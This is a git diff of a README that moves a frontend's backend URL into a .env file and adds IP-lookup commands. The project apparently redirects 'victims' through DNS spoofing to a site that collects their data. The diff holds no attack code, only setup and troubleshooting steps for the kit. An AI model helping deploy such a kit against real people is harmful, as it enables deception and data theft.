@@ -106,14 +106,21 @@ cd frontend
 # Install dependencies
 yarn install
 
-# Update API URL in DataCollectionHandler.ts
-# Change API_URL to your machine's local IP
-# Example: const API_URL = 'http://192.168.1.100:5000';
+# Configure backend URL in .env file
+# Edit frontend/.env and replace 'your_pc_ip' with your actual IP
+# Example: VITE_API_URL=http://192.168.1.100:5000
 ```
 
-Edit `frontend/src/utils/DataCollectionHandler.ts`:
-```typescript
-const API_URL = 'http://YOUR_MACHINE_IP:5000';  // Replace with your IP
+**Find your IP address:**
+```bash
+ip addr show | grep inet  # Linux/Mac
+# or
+ipconfig  # Windows
+```
+
+Edit `frontend/.env`:
+```bash
+VITE_API_URL=http://192.168.1.100:5000  # Replace with your IP
 ```
 
 **Build for production:**
@@ -383,7 +390,7 @@ sudo netstat -tulpn | grep :53
 ### Frontend can't connect to backend
 - Verify Flask is running on `0.0.0.0:5000`
 - Check firewall rules: `sudo ufw allow 5000`
-- Update API_URL in DataCollectionHandler.ts with correct IP
+- Update `VITE_API_URL` in `frontend/.env` with correct IP (replace `your_pc_ip`)
 
 ### Victims still see real site
 - Clear DNS cache on victim device
